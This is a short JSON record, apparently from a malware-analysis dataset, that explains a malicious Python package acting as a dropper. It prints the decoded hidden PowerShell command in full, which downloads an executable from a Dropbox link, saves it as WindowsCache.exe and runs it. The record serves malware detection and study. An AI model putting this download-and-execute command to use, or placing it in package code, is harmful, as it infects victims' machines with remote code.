      "malicious_behavior": "This code is malicious. It attempts to execute a hidden PowerShell command using a base64-encoded payload if a file or directory named 'tahg' does not exist. The encoded PowerShell command decodes to: 'powershell Invoke-WebRequest -Uri \"https://dl.dropbox.com/s/szgnyt9zbu0qmv/Esquele.exe?dl=0\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"'. This means the script downloads an executable file named 'Esquele.exe' from Dropbox and saves it as 'WindowsCache.exe' in the user's home directory, then executes it. This is a classic dropper behavior, where a Python package or script is used to download and run a potentially malicious executable on the victim's machine. The use of obfuscation (base64 encoding, hidden PowerShell window, and misleading setup metadata) further indicates an attempt to evade detection. This code can lead to remote code execution, compromise of the system, and further malware infection.",
